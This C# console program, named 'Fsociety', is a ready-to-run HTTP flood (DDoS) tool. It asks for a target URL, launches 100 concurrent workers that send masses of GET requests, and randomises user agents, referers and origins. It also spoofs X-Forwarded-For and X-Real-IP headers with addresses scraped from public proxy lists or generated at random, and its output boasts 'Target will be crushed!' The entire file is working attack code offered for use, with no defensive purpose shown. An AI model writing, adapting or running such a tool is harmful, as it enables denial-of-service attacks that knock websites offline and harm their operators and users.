using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Fsociety
{
    class Program
    {
        private static readonly HttpClient _httpClient = new HttpClient();
        private static readonly Random _random = new Random();

        private static readonly string[] userAgents = new[]
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
        };

        private static readonly string[] proxySources = new[]
        {
            "https://www.us-proxy.org",
            "https://www.socks-proxy.net",
            "https://proxyscrape.com/free-proxy-list",
            "https://www.proxynova.com/proxy-server-list/",
            "https://proxybros.com/free-proxy-list/",
            "https://proxydb.net/",
            "https://spys.one/en/free-proxy-list/",
            "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1",
            "https://hasdata.com/free-proxy-list",
            "https://www.proxyrack.com/free-proxy-list/",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxy-list.download/api/v1/get?type=socks4",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
            "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt"
        };

        private static readonly string asciiArt = @"
██▀███  ▓█████  ███▄    █   █████▒██▀███  ▓█████▓██   ██▓▓█████▄ 
▓██ ▒ ██▒▓█   ▀  ██ ▀█   █ ▓██   ▒▓██ ▒ ██▒▓█   ▀ ▒██  ██▒▒██▀ ██▌
▓██ ░▄█ ▒▒███   ▓██  ▀█ ██▒▒████ ░▓██ ░▄█ ▒▒███    ▒██ ██░░██   █▌
▒██▀▀█▄  ▒▓█  ▄ ▓██▒  ▐▌██▒░▓█▒  ░▒██▀▀█▄  ▒▓█  ▄  ░ ▐██▓░░▓█▄   ▌
░██▓ ▒██▒░▒████▒▒██░   ▓██░░▒█░   ░██▓ ▒██▒░▒████▒ ░ ██▒▓░░▒████▓ 
░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░   ▒ ▒  ▒ ░   ░ ▒▓ ░▒▓░░░ ▒░ ░  ██▒▒▒  ▒▒▓  ▒ 
░▒ ░ ▒░ ░ ░  ░░ ░░   ░ ▒░ ░       ░▒ ░ ▒░ ░ ░  ░▓██ ░▒░  ░ ▒  ▒ 
░░   ░    ░      ░   ░ ░  ░ ░     ░░   ░    ░   ▒ ▒ ░░   ░ ░  ░ 
░        ░  ░         ░           ░        ░  ░░ ░        ░    
                                                ░ ░      ░      
";

        static async Task Main()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(asciiArt);
            Console.ResetColor();

            Console.Write("Enter target URL: ");
            string targetUrl = Console.ReadLine();

            Console.Write("Enter number of requests: ");
            if (!int.TryParse(Console.ReadLine(), out int numRequests) || numRequests <= 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Number of requests must be an integer greater than 0!");
                Console.ResetColor();
                return;
            }

            if (string.IsNullOrWhiteSpace(targetUrl))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Enter a valid URL!");
                Console.ResetColor();
                return;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("DDoS attack started. Target will be crushed!");
            Console.ResetColor();

            var cts = new CancellationTokenSource();
            try
            {
                await RunAttackAsync(targetUrl, numRequests, cts.Token);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Attack finished! Target down!");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Attack error: {ex.Message}");
                Console.ResetColor();
            }
        }

        private static async Task RunAttackAsync(string url, int totalRequests, CancellationToken token)
        {
            const int maxConcurrent = 100;
            int requestsPerWorker = totalRequests / maxConcurrent;
            var allIps = await GetAllIpsAsync(token);

            if (allIps.Count == 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No IP list found. Generating random IPs...");
                Console.ResetColor();
                allIps.AddRange(Enumerable.Range(0, 1000).Select(_ => $"10.0.{_random.Next(0, 255)}.{_random.Next(0, 255)}"));
            }

            var ipCycle = allIps.ToArray();
            var tasks = new List<Task>();
            var sw = System.Diagnostics.Stopwatch.StartNew();

            async Task Worker()
            {
                for (int i = 0; i < requestsPerWorker; i++)
                {
                    await SendRequestAsync(url, ipCycle[_random.Next(ipCycle.Length)], token);
                    await Task.Delay(1, token); // Минимальная задержка, как в Python
                }
            }

            for (int i = 0; i < maxConcurrent; i++)
            {
                tasks.Add(Task.Run(Worker, token));
            }

            await Task.WhenAll(tasks);
            sw.Stop();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"Attack finished in {sw.Elapsed.TotalSeconds:F2} seconds. Target down!");
            Console.ResetColor();
        }

        private static async Task SendRequestAsync(string url, string ip, CancellationToken token)
        {
            var request = new HttpRequestMessage(HttpMethod.Get, url);
            request.Headers.Add("User-Agent", userAgents[_random.Next(userAgents.Length)]);
            request.Headers.Add("X-Forwarded-For", ip);
            request.Headers.Add("Accept", _random.Next(2) == 0 ? "text/html" : "application/json");
            request.Headers.Add("Accept-Language", new[] { "en-US", "pl-PL", "de-DE", "fr-FR", "es-ES", "it-IT" }[_random.Next(6)]);
            request.Headers.Add("Accept-Encoding", new[] { "gzip", "deflate", "br" }[_random.Next(3)]);
            request.Headers.Add("Cache-Control", "no-cache");
            request.Headers.Add("Connection", _random.Next(2) == 0 ? "keep-alive" : "close");
            request.Headers.Add("X-Real-IP", ip);
            request.Headers.Add("X-Request-ID", Guid.NewGuid().ToString());
            request.Headers.Add("Referer", new[] { "https://google.com", "https://bing.com", "https://yahoo.com", url, "https://duckduckgo.com" }[_random.Next(5)]);
            request.Headers.Add("Origin", new[] { "https://example.com", url, "https://randomsite.com" }[_random.Next(3)]);

            try
            {
                using var response = await _httpClient.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, token);
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"fsociety@root -> {url} with IP: {ip} - Status: {(int)response.StatusCode}");
                Console.ResetColor();
            }
            catch
            {
                // Игнорируем ошибки, как в Python-версии
            }
        }

        private static async Task<List<string>> GetAllIpsAsync(CancellationToken token)
        {
            var allIps = new List<string>();
            var tasks = proxySources.Select(url => FetchIpAddressesAsync(url, token)).ToList();
            var ipLists = await Task.WhenAll(tasks);

            foreach (var ipList in ipLists)
            {
                allIps.AddRange(ipList);
            }

            // Добавляем случайные IP, как в Python-версии
            allIps.AddRange(Enumerable.Range(0, 500).Select(_ => $"{_random.Next(1, 255)}.{_random.Next(0, 255)}.{_random.Next(0, 255)}.{_random.Next(0, 255)}"));

            return allIps;
        }

        private static async Task<List<string>> FetchIpAddressesAsync(string url, CancellationToken token)
        {
            try
            {
                var response = await _httpClient.GetStringAsync(url, token);
                var ips = Regex.Matches(response, @"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b")
                    .Cast<Match>()
                    .Select(m => m.Value)
                    .ToList();
                return ips;
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Failed to fetch IPs from {url}: {ex.Message}");
                Console.ResetColor();
                return new List<string>();
            }
        }
    }
}